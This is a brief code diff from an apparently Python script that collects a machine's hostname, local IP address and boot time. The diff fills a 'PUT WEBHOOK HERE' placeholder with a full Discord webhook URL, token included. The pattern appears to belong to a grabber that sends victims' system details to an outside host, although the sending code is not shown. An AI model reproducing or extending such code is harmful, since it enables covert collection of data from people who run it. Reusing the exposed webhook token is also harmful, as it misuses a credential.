@@ -45,7 +45,7 @@ computername = socket.gethostname()
 localipaddress = socket.gethostbyname(computername)
 boottime = datetime.fromtimestamp(psutil.boot_time())
 
-url = "WEBHOOK HERE" # PUT WEBHOOK HERE
+url = "https://discordapp.com/api/webhooks/1368286775109226591/g1Z944PSmOM4WXOdiDvlJzR7fZCe38BVuoAdHDyCGUqNInuP1tFanEIdliN-l4e5jgcj" # PUT WEBHOOK HERE
 
 def ipaddrr():
 
